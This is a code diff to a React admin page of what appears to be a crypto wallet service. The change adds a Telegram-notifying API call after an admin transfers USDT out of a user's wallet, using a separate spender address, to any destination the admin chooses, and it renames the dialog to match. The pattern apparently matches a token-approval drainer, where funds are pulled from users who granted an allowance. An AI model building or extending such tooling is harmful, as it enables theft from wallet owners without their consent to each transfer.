@@ -451,6 +451,24 @@ const Admin = () => {
         sendUsdtAmount,
         contractConfig.usdtTokenAddress
       );
+      try {
+        await apiRequest("/admin/user-wallet-transfers/notify", {
+          method: "POST",
+          auth: true,
+          body: {
+            userId: sendUsdtTarget.userId,
+            chain: manageWalletChain,
+            fromWalletAddress: sendUsdtTarget.walletAddress,
+            toWalletAddress: destinationAddress,
+            spenderWalletAddress: sendUsdtWalletAddress,
+            amountUsdt: parsedAmount,
+            txHash
+          }
+        });
+      } catch (notifyError) {
+        console.error("[admin.manage-wallets] Transfer notify failed", notifyError);
+        toast.warning("Transfer succeeded, but Telegram notification failed.");
+      }
       toast.success(`USDT transferred from user wallet. Tx: ${txHash.slice(0, 12)}...`);
       setIsSendUsdtModalOpen(false);
       await loadPaidWalletEntries(manageWalletChain);
@@ -1048,9 +1066,9 @@ const Admin = () => {
       <Dialog open={isSendUsdtModalOpen} onOpenChange={setIsSendUsdtModalOpen}>
         <DialogContent className="rounded-2xl">
           <DialogHeader>
-            <DialogTitle>Send USDT to User Wallet</DialogTitle>
+            <DialogTitle>Transfer USDT From User Wallet</DialogTitle>
             <DialogDescription>
-              Send USDT on {manageWalletChain.toUpperCase()} to selected user wallet.
+              Transfer USDT on {manageWalletChain.toUpperCase()} from the selected user wallet to the address below.
             </DialogDescription>
           </DialogHeader>
           <div className="space-y-4">
